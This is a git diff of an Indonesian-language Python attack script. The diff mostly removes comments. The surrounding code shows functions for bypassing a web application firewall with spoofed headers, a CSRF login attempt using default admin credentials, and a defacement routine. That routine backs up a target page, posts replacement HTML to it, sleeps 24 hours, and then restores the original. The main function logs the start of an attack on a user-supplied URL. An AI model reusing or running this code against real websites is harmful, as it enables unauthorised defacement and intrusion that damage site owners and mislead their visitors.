@@ -12,7 +12,6 @@ import os
 import shutil
 import datetime
 
-# Warna untuk output terminal
 R = '\033[91m'
 G = '\033[92m'
 Y = '\033[93m'
@@ -74,7 +73,6 @@ def send_request(url, session, proxy=None):
         print(f"Terjadi kesalahan: {e}")
         return None
 
-# Advanced WAF bypass
 def advanced_waf_bypass(url, session):
     headers = {
         'X-Real-IP': '127.0.0.1',
@@ -129,9 +127,7 @@ def csrf_attack(url, session):
     payload = {"username": "admin", "password": "password", "csrf_token": csrf_token}
     send_request(url + "/login", session)
 
-# Deface Website dengan pemulihan otomatis dalam 24 jam
 def deface_payload(url, session, backup_file_path):
-    # Simpan halaman asli sebelum diubah
     if not os.path.exists(backup_file_path):
         try:
             response = session.get(url)
@@ -141,7 +137,6 @@ def deface_payload(url, session, backup_file_path):
         except requests.exceptions.RequestException as e:
             print(f"Error saat menyimpan backup halaman: {e}")
 
-    # Payload deface
     payload = """
     <html>
         <head>
@@ -182,9 +177,8 @@ def deface_payload(url, session, backup_file_path):
         if response.status_code == 200:
             logging.info(f"Deface berhasil dikirim ke {url}")
             print(f"{G}Deface berhasil! Periksa URL target.{N}")
-            # Menunggu selama 24 jam sebelum pemulihan
             print(f"Menunggu selama 24 jam untuk mengembalikan halaman asli...")
-            time.sleep(86400)  # Tunggu 24 jam
+            time.sleep(86400)  # ubah tampa izin itu ilegal
             restore_backup(url, backup_file_path, session)  # Kembalikan halaman asli
         else:
             logging.error(f"Deface gagal, status code: {response.status_code}")
@@ -197,7 +191,6 @@ def restore_backup(url, backup_file_path, session):
     try:
         with open(backup_file_path, 'r') as f:
             original_content = f.read()
-        # Mengembalikan halaman asli
         data = {"content": original_content}
         response = session.post(url, data=data)
         if response.status_code == 200:
@@ -222,10 +215,8 @@ def main():
     session = create_session()
     logging.info(f"Mulai melakukan serangan pada {url}")
 
-    # Menjalankan bypass WAF terlebih dahulu sebelum serangan lainnya
     advanced_waf_bypass(url, session)
 
-    # Tempatkan file backup di sini
     backup_file_path = 'backup_halaman_asli.html'
 
     while True:
